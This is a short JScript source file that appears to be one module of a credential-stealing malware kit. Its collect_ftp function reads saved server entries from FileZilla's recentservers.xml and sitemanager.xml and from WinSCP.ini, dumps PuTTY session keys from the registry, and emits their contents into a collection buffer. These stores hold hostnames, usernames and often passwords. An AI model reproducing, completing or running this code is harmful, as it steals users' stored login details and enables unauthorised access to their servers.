// chunk: collectors/ftp_credentials
// depends: core/emit_buffer, core/file_ops
// provides: collect_ftp
// format: jscript

function collect_ftp() {
    emit("\r\n=== FTP/SSH CLIENT CREDENTIALS ===\r\n");
    var appdata = _s.ExpandEnvironmentStrings("%APPDATA%");
    var configs = [
        {name: "FileZilla", path: appdata + "\\FileZilla\\recentservers.xml"},
        {name: "FileZilla Sitemanager", path: appdata + "\\FileZilla\\sitemanager.xml"},
        {name: "WinSCP", path: appdata + "\\WinSCP\\WinSCP.ini"},
        {name: "PuTTY sessions", path: "REGISTRY"}
    ];
    for (var i = 0; i < configs.length; i++) {
        if (configs[i].path === "REGISTRY") {
            emit("--- PuTTY Sessions ---\r\n");
            emit(_run("reg query \"HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\" /s 2>NUL"));
        } else if (file_exists(configs[i].path)) {
            emit("--- " + configs[i].name + " ---\r\n");
            emit(read_file(configs[i].path, 65536));
            emit("\r\n");
        }
    }
}
